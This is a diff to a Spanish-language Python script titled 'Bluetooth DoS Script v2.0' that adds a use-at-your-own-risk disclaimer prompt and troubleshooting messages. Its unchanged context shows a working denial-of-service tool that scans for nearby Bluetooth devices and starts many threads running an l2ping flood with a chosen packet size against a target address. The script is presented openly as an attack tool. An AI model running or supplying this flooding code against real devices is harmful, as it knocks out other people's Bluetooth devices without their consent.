@@ -4,6 +4,7 @@ import threading
 import time
 import sys
 
+# --- Constantes de Estilo para la Consola ---
 C_RED = '\x1b[31m'
 C_GREEN = '\x1b[32m'
 C_YELLOW = '\x1b[33m'
@@ -17,7 +18,19 @@ def print_logo():
     ║        Bluetooth DoS Script v2.0         ║
     ╚══════════════════════════════════════════╝
     {C_RESET}""")
+
+def get_disclaimer_approval():
+    """Muestra la advertencia y solicita la aprobación del usuario."""
+    print(f"{C_YELLOW}Esta es una versión del script original escrito en \"crypt0b0y/BLUETOOTH-DOS-ATTACK-SCRIPT\".")
+    print("Todo el crédito es para ese perfil.")
+    print(f"Por lo demás, usa esto bajo tu responsabilidad.{C_RESET}\n")
     
+    try:
+        approval = input("¿Deseas continuar? (s/n) > ")
+        return approval.lower() == 's'
+    except KeyboardInterrupt:
+        return False
+
 def find_bluetooth_adapters():
     """Detecta y devuelve una lista de adaptadores Bluetooth disponibles (ej. hci0, hci1)."""
     try:
@@ -57,10 +70,7 @@ def scan_devices(adapter):
         return []
 
 def start_l2ping_flood(target_addr, package_size, adapter):
-    """
-    Inicia un proceso de l2ping flood.
-    Usa subprocess.Popen para no bloquear el hilo y redirige la salida.
-    """
+    """Inicia un proceso de l2ping flood."""
     command = ['l2ping', '-i', adapter, '-s', str(package_size), '-f', target_addr]
     try:
         subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -70,7 +80,6 @@ def start_l2ping_flood(target_addr, package_size, adapter):
     except Exception as e:
         print(f"{C_RED}[!] Error al iniciar el thread de l2ping: {e}{C_RESET}")
         return
-
 
 def main():
     """Función principal del script."""
@@ -83,6 +92,11 @@ def main():
 
     adapters = find_bluetooth_adapters()
     if not adapters:
+        print(f"\n{C_RED}[!] FATAL: No se encontraron adaptadores Bluetooth funcionales.{C_RESET}")
+        print(f"{C_YELLOW}Por favor, revisa lo siguiente antes de volver a ejecutar:{C_RESET}")
+        print("  1. Asegúrate de que tu adaptador Bluetooth físico esté encendido.")
+        print("  2. Ejecuta 'hciconfig' en tu terminal para ver si se detecta algún adaptador (ej. hci0).")
+        print("  3. Comprueba el estado del servicio Bluetooth con: 'sudo systemctl status bluetooth'.")
         sys.exit(1)
     
     if len(adapters) == 1:
@@ -131,7 +145,7 @@ def main():
 
     for i in range(thread_count):
         t = threading.Thread(target=start_l2ping_flood, args=[target_addr, package_size, adapter])
-        t.daemon = True 
+        t.daemon = True
         t.start()
 
     print(f"{C_GREEN}[*] Ataque iniciado contra {target_addr} con {thread_count} hilos.{C_RESET}")
